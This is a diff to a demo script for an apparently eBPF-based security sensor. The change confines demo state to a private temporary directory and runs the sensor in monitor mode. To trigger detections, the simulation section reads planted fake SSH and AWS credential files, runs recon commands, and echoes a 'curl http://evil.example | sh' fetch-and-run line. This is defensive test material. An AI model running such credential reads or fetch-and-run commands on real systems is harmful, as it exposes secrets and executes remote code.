@@ -7,11 +7,16 @@
 #   sudo ./demo.sh --fleet    # plus 20 simulated hosts with a day of history
 #
 # Then open http://localhost:8080 and sign in with the token printed below.
+#
+# Everything the demo writes (console state, sensor config, logs, the fake
+# credentials it reads) lives in a fresh private directory from mktemp; it
+# never writes to /etc/wisp or /var/log/wisp. The demo sensor runs in monitor
+# mode and uses the repository's policy files.
 set -euo pipefail
 cd "$(dirname "$0")"
 [[ $EUID -eq 0 ]] || { echo "run as root (the sensor loads an eBPF program)"; exit 1; }
 FLEET=0; [[ "${1:-}" == "--fleet" ]] && FLEET=1
-STATE=/tmp/wisp-demo; mkdir -p "$STATE"
+STATE=$(mktemp -d "${TMPDIR:-/tmp}/wisp-demo.XXXXXXXX")  # 0700, root-owned, unpredictable
 
 echo "==> building"
 make >/dev/null
@@ -22,8 +27,6 @@ TOKEN_OUT=$(./console/wisp-console -gen-token admin:demo)
 TOKEN=$(sed -n 2p <<<"$TOKEN_OUT" | tr -d ' ')
 sed -n 5p <<<"$TOKEN_OUT" | sed 's/^ *//' > "$STATE/roles.conf"
 
-mkdir -p /etc/wisp /var/log/wisp /var/lib/wisp
-cp -n config/*.conf /etc/wisp/ 2>/dev/null || true
 
 echo "==> starting console on http://localhost:8080"
 ./console/wisp-console -listen 127.0.0.1:8750 -http 127.0.0.1:8080 \
@@ -31,7 +34,13 @@ echo "==> starting console on http://localhost:8080"
   -roles "$STATE/roles.conf" -state-dir "$STATE" >"$STATE/console.log" 2>&1 &
 CPID=$!
 
-sed 's/^telemetry = .*/telemetry = 1/; s/^housekeeping = .*/housekeeping = 5/' /etc/wisp/wisp.conf > "$STATE/wisp.conf"
+# The shipped wisp.conf with the repository's policy files, and logs and
+# state in $STATE (not the host's /var/log/wisp and /var/lib/wisp).
+sed -e "s|/etc/wisp/|$PWD/config/|g" \
+    -e "s|^state_dir .*|state_dir = $STATE/state|; s|^log_dir .*|log_dir = $STATE/log|" \
+    -e 's/^telemetry = .*/telemetry = 1/; s/^housekeeping = .*/housekeeping = 5/' \
+    -e 's/^mode = .*/mode = monitor/' config/wisp.conf > "$STATE/wisp.conf"
+mkdir -m 0750 "$STATE/state" "$STATE/log"
 cat >> "$STATE/wisp.conf" <<EOF
 console = 127.0.0.1:8750
 cert = $PWD/pki/agent.crt
@@ -53,10 +62,11 @@ trap 'kill $CPID $WPID $SPID 2>/dev/null' EXIT
 sleep 1.5
 
 echo "==> simulating activity (benign + malicious)"
-mkdir -p /tmp/demo/.ssh /tmp/demo/.aws
-echo privkey > /tmp/demo/.ssh/id_rsa; echo awscreds > /tmp/demo/.aws/credentials
-cat /tmp/demo/.ssh/id_rsa >/dev/null          # CRED-001
-cat /tmp/demo/.aws/credentials >/dev/null     # CRED-002
+ACT="$STATE/activity"   # inside the private mktemp directory
+mkdir -p "$ACT/.ssh" "$ACT/.aws"
+echo privkey > "$ACT/.ssh/id_rsa"; echo awscreds > "$ACT/.aws/credentials"
+cat "$ACT/.ssh/id_rsa" >/dev/null          # CRED-001
+cat "$ACT/.aws/credentials" >/dev/null     # CRED-002
 whoami >/dev/null; id >/dev/null; hostname >/dev/null  # LOL-003
 bash -c 'echo "curl http://evil.example | sh"' >/dev/null   # RSHELL-02
 if command -v npm >/dev/null; then
@@ -73,6 +83,7 @@ cat <<EOF
    $TOKEN
 
  State, logs and the event journal: $STATE
+ (sensor alerts: $STATE/log/alerts.jsonl; remove the directory when done)
  Ctrl-C to stop.
 ================================================================
 EOF
